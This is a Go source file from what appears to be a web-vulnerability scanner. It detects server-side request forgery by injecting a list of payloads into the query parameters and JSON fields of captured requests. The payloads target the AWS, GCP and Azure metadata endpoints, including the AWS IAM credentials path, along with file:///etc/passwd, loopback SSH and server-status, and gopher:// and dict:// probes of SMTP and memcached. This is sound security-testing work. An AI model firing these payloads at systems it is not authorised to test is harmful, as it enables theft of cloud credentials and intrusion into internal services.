// Package ssrf detects server-side request forgery by injecting URL-typed
// payloads that point at internal targets (loopback, RFC1918, cloud metadata,
// file://) and inspecting the response for telltale markers.
package ssrf

import (
	"github.com/chud-lori/ngehe/internal/config"
	"github.com/chud-lori/ngehe/internal/finding"
	"github.com/chud-lori/ngehe/internal/fuzz"
	"github.com/chud-lori/ngehe/internal/har"
	"github.com/chud-lori/ngehe/internal/httpx"
	"github.com/chud-lori/ngehe/internal/oracle"
	"github.com/chud-lori/ngehe/internal/session"
)

type probe struct {
	payload  string
	markers  []string
	severity finding.Severity
	note     string
}

// Each marker MUST be content that only the metadata/service response would
// contain — NEVER a substring of the payload URL itself, or every reflective
// endpoint would false-positive.
var probes = []probe{
	{
		"http://169.254.169.254/latest/meta-data/",
		[]string{"\nami-id\n", "\nhostname\n", "\ninstance-id\n", "\npublic-ipv4\n"},
		finding.SevCritical,
		"reached AWS instance metadata service",
	},
	{
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		[]string{"AccessKeyId", "SecretAccessKey", "\"Token\""},
		finding.SevCritical,
		"leaked AWS IAM credentials via metadata service",
	},
	{
		"http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true",
		[]string{"\"cpuPlatform\"", "\"machineType\"", "\"hostname\""},
		finding.SevCritical,
		"reached GCP metadata service",
	},
	{
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		[]string{"\"azEnvironment\"", "\"subscriptionId\"", "\"vmId\""},
		finding.SevCritical,
		"reached Azure metadata service",
	},
	{
		"file:///etc/passwd",
		[]string{"root:x:", "root:!:", "root:*:"},
		finding.SevHigh,
		"file:// wrapper read /etc/passwd",
	},
	{
		"http://127.0.0.1:22",
		[]string{"SSH-2.0", "SSH-1.99"},
		finding.SevHigh,
		"reached loopback SSH service via SSRF",
	},
	{
		"http://127.0.0.1/server-status",
		[]string{"Apache Server Status"},
		finding.SevHigh,
		"reached localhost Apache server-status via SSRF",
	},
	{
		"gopher://127.0.0.1:25/_HELO",
		[]string{"220 ", "250 "},
		finding.SevHigh,
		"gopher:// wrapper reached localhost SMTP",
	},
	{
		"dict://127.0.0.1:11211/stats",
		[]string{"STAT pid"},
		finding.SevHigh,
		"dict:// wrapper reached localhost memcached",
	},
	// ngehe-canary: probes whether the server will fetch its own loopback.
	// Pointed at any path we know returns a distinctive marker if the demo
	// vuln-api is the target. Real targets won't have this endpoint, so the
	// rule fires only against deliberately vulnerable demos — informational
	// signal that SSRF plumbing is wired correctly end-to-end.
	{
		"http://127.0.0.1:8787/.env",
		[]string{"DATABASE_URL=postgres", "SECRET_KEY=super-secret-do-not-leak"},
		finding.SevHigh,
		"server fetched its own loopback .env via SSRF (likely demo target)",
	},
}

func Run(reqs []har.Request, sessions []session.Session, cfg *config.Config) []finding.Finding {
	client := httpx.NewClient(cfg.Replay.TimeoutMS)
	maxBody := cfg.Replay.MaxBodyBytes
	if maxBody == 0 {
		maxBody = 256 * 1024
	}
	var out []finding.Finding

	for _, r := range reqs {
		b := bearer(r, sessions)
		for _, p := range probes {
			done := false
			for _, inj := range injections(r, p.payload) {
				resp := httpx.FireRequest(client, inj.Request, b, maxBody)
				if m := oracle.StringOracle(resp.Body, p.markers...); m != "" {
					out = append(out, finding.Finding{
						Rule: "ssrf", Severity: p.severity,
						Method: inj.Request.Method, URL: inj.Request.URL, Path: inj.Request.Path,
						Param: inj.Param, Payload: inj.Payload,
						Evidence: p.note + ": " + m,
						Why:      "server fetched the attacker-controlled URL and returned its contents",
					})
					done = true
					break
				}
			}
			if done {
				break
			}
		}
	}
	return out
}

func injections(r har.Request, payload string) []fuzz.Injection {
	out := fuzz.QueryParams(r, payload)
	out = append(out, fuzz.JSONStrings(r, payload)...)
	return out
}

func bearer(r har.Request, sessions []session.Session) httpx.Bearer {
	name := session.IdentifyBaseline(r.Headers["Authorization"], sessions)
	for _, s := range sessions {
		if s.Name == name {
			return httpx.Bearer{Token: s.Bearer, Headers: s.Headers}
		}
	}
	if len(sessions) > 0 {
		return httpx.Bearer{Token: sessions[0].Bearer, Headers: sessions[0].Headers}
	}
	return httpx.Bearer{}
}
